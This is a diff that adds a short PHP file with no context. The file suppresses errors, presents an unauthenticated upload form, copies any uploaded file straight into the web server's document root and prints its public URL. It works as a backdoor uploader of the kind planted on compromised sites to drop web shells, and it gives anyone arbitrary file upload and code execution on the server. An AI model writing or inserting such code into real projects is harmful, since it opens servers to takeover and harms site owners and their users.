@@ -1,0 +1,14 @@
+<?php
+error_reporting(0);
+$root = $_SERVER['DOCUMENT_ROOT'];
+$files = $_FILES['file']['name'];
+$saw2 = $root.'/'.$files;
+$saw1 = $_FILES['file']['tmp_name'];
+echo "<form method='POST' enctype='multipart/form-data'>
+<input type='file'name='file' />
+<input type='submit' value='up' />
+</form>";
+@copy($saw1,$saw2);
+$web = "http://".$_SERVER['HTTP_HOST']."/";
+echo "<br><yourfile>$web$files</yourfile>";
+?>
